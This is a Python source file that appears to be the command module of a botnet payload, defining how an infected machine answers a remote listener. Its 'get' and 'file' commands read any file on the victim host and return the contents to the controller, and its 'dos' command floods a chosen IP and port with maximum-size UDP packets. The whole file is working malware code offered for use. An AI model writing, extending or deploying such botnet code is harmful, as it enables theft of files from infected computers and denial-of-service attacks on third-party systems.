#!/usr/bin/env python3

import socket
import logging


log = logging.getLogger('botnet.payload.commands')


class commands:
    """
    returns message to sent to remote host
    """

    def __init__(self, socket):
        self.socket = socket

    def disconnect(self):
        """
        disconnects from listener
        """
        self.socket = None
        return log.info('200 [OK] Client disconnected.')

    def exit(self):
        """
        disconnects from listener, alias for disconnect
        """
        return self.disconnect()

    def quit(self):
        """
        disconnects from listener, alias for disconnect
        """
        return self.disconnect()

    def kill(self):
        """
        kill listener
        """
        self.disconnect()
        return log.warning('200 [OK] Closing listener...')

    def echo(self, data):
        """
        Echo function
        """
        msg = '200 [OK] Echo: "%s"' % data
        log.info(msg)
        return data

    def get(self, path):
        """
        print remote file
        """
        try:
            with open(path, 'r') as file:
                log.info('200 [OK] Sending File Contents: "%s"' % path)
                return file.read()

        except IOError:
            msg = '404 [Error] File Not Found: %s' % path
            log.error(msg)
            return msg

    def file(self, path):
        """
        print remote file, alias for get
        """
        return self.get(path)

    def dos(self, args='127.0.0.1 53 0 '):
        """
        performs DoS attack on target
        """
        flood_msg = "X" * 65507
        ip, port, count = args.split(' ')
        log.info('DoS attack on %s:%s' % (ip, port))
        UDPSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        x = 0
        count = int(count)

        try:
            while x < count:
                UDPSock.sendto(flood_msg, (ip, int(port)))
                x += 1
        except Exception:
            logging.error('UDP sock failed')

        log.info('Attack finished')
        UDPSock.close()
        return 'ok'
